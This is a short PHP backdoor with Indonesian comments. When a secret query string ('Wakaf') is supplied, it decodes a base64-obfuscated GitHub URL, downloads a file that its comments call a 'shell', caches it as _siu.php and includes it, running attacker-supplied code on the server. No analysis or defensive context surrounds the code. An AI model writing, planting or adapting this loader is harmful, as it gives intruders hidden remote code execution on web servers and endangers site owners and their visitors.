<?php
if ($_SERVER['QUERY_STRING'] === 'Wakaf') {
    $url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzVZNEgvc2VvL21haW4vc2VvYmFyYmFyLnBocA==');
    $cache_file = __DIR__ . '/_siu.php';

    // Cek apakah file shell sudah disimpan
    if (!file_exists($cache_file)) {
        $s = @file_get_contents($url);

        // Validasi isi
        if (!$s || stripos($s, '<html') !== false || strlen($s) < 10) {
            http_response_code(500);
            die("❌ Gagal ambil shell dari GitHub atau isinya bukan PHP.");
        }

        // Simpan shell ke file lokal
        file_put_contents($cache_file, $s);
    }

    // Jalankan shell dari file lokal
    try {
        include $cache_file;
    } catch (Throwable $e) {
        http_response_code(500);
        echo "❌ Shell error: " . htmlspecialchars($e->getMessage());
    }

    exit;
}
?>
